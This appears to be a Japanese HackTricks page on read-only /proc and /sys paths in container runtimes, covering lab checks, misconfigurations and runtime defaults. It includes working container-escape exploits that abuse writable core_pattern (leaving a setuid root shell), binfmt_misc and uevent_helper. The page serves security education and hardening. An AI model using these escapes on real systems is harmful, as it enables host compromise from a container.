# 読み取り専用システムパス

{{#include ../../../../banners/hacktricks-training.md}}

読み取り専用システムパスは、マスクされたパスとは別の保護です。パスを完全に隠す代わりに、ランタイムはそのパスを公開しますが読み取り専用でマウントします。これは、読み取りアクセスが許容されるか運用上必要な一部の procfs や sysfs の場所で一般的ですが、書き込みは危険すぎる場合に使われます。

目的は明快です：多くのカーネルインタフェースは書き込み可能になると非常に危険になります。読み取り専用マウントは調査の価値を完全に取り除くものではありませんが、侵害されたワークロードがそのパス経由でカーネル向けファイルを変更するのを防ぎます。

## 動作

ランタイムは proc/sys ビューの一部を読み取り専用としてマークすることが多いです。ランタイムやホストによって異なりますが、以下のようなパスが含まれることがあります：

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

実際の一覧は環境により異なりますが、モデルは同じです：必要な箇所で可視性を許可し、デフォルトで変更を拒否します。

## ラボ

Docker が宣言した読み取り専用パスの一覧を確認する：
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
コンテナ内からマウントされた proc/sys ビューを確認する:
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## セキュリティへの影響

読み取り専用のシステムパスは、ホストに影響を及ぼす多くの悪用手法を制限します。攻撃者が procfs や sysfs を調べられる場合でも、そこで書き込みできないことは、カーネル設定パラメータ、クラッシュハンドラ、モジュール読み込みを補助する仕組み、その他の制御インターフェイスといった直接的な改変経路を多数排除します。露出自体が消えるわけではありませんが、情報漏洩からホストへの影響への移行は難しくなります。

## 誤設定

主なミスは、機密性の高いパスのマスク解除や読み書き可能に再マウントすること、書き込み可能な bind mounts でホストの proc/sys コンテンツを直接公開すること、あるいは安全なランタイムのデフォルトを実質的にバイパスする privileged モードを使用することです。Kubernetes では、`procMount: Unmasked` や privileged なワークロードが、弱い proc 保護と同時に発生することが多いです。別の一般的な運用ミスは、ランタイムが通常これらのパスを読み取り専用でマウントするため、すべてのワークロードがそのデフォルトを継承していると仮定してしまうことです。

## 悪用

保護が弱ければ、まず書き込み可能な proc/sys エントリを探します：
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
書き込み可能なエントリが存在する場合、価値の高いフォローアップ経路には次のものがあります:
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
What these commands can reveal:
- `/proc/sys` の書き込み可能なエントリは、コンテナが単に参照するだけでなくホストのカーネル挙動を変更できることを意味することが多い。
- `core_pattern` は特に重要で、書き込み可能なホスト側の値は、pipe ハンドラを設定した後にプロセスをクラッシュさせることでホスト上でのコード実行経路に変えられる。
- `modprobe` はカーネルがモジュールロード関連の処理で使うヘルパーを示す; 書き込み可能な場合は古典的な高価値ターゲットである。
- `binfmt_misc` はカスタムインタプリタの登録が可能かどうかを示す。登録が書き込み可能なら、単なる情報 leak にとどまらず実行プリミティブになり得る。
- `panic_on_oom` はホスト全体のカーネル判断を制御するため、リソース枯渇をホスト上の denial of service に変えることができる。
- `uevent_helper` は、書き込み可能な sysfs ヘルパーパスがホストコンテキストでの実行を生む最も明確な例の一つである。

興味深い発見は、本来は読み取り専用であるべきホスト向けの proc 設定や sysfs エントリが書き込み可能になっている場合である。その時点で、ワークロードは制限されたコンテナの視点から意味のあるカーネルへの影響へと移行している。

### 完全な例: `core_pattern` を使ったホストエスケープ

`/proc/sys/kernel/core_pattern` がコンテナ内部から書き込み可能でホストのカーネルビューを指している場合、クラッシュ後に payload を実行するよう悪用できる:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
パスが本当にホストカーネルに到達する場合、ペイロードはホスト上で実行され、setuidシェルを残します。

### 完全な例: `binfmt_misc` の登録

もし `/proc/sys/fs/binfmt_misc/register` が書き込み可能であれば、カスタムインタプリタの登録により、該当するファイルが実行されたときにコード実行を引き起こすことができます:
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
ホスト向けに公開された書き込み可能な `binfmt_misc` 上では、結果として kernel がトリガーするインタプリタの経路でコード実行が発生します。

### 完全な例: `uevent_helper`

もし `/sys/kernel/uevent_helper` が書き込み可能であれば、該当するイベントが発生した際に kernel はホストパス上のヘルパーを呼び出すことがあります:
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
これが非常に危険な理由は、helper path が安全なコンテナのみのコンテキストではなく、ホストのファイルシステムの視点から解決されるためです。

## Checks

これらのチェックは、procfs/sysfs の露出が想定どおり読み取り専用になっているか、およびワークロードが依然として機密性の高いカーネルインターフェースを変更できるかどうかを確認します。
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
What is interesting here:

- 通常、ハードニングされたワークロードは書き込み可能な proc/sys エントリを非常に少数しか公開すべきではありません。
- 書き込み可能な `/proc/sys` パスは、通常の読み取りアクセスより重要なことが多いです。
- ランタイムがパスを読み取り専用と報告しているが実際には書き込み可能な場合は、マウント伝播、バインドマウント、および特権設定を注意深く確認してください。

## ランタイムのデフォルト

| Runtime / platform | デフォルト状態 | デフォルトの動作 | よくある手動での緩和 |
| --- | --- | --- | --- |
| Docker Engine | デフォルトで有効 | Docker は機密性の高い proc エントリに対してデフォルトの読み取り専用パスリストを定義します | ホストの proc/sys マウントの公開、`--privileged` |
| Podman | デフォルトで有効 | Podman は明示的に緩和されない限りデフォルトの読み取り専用パスを適用します | `--security-opt unmask=ALL`、広範なホストマウント、`--privileged` |
| Kubernetes | ランタイムのデフォルトを継承 | Pod 設定やホストマウントで弱められない限り、基盤となるランタイムの読み取り専用パスモデルを使用します | `procMount: Unmasked`、特権ワークロード、書き込み可能なホストの proc/sys マウント |
| containerd / CRI-O under Kubernetes | ランタイムのデフォルト | 通常、OCI/ランタイムのデフォルトに依存します | Kubernetes の行と同じ; ランタイムの設定を直接変更すると挙動が弱められる可能性がある |

重要な点は、読み取り専用のシステムパスは通常ランタイムのデフォルトとして存在するが、特権モードやホストのバインドマウントによって簡単に弱体化される、ということです。
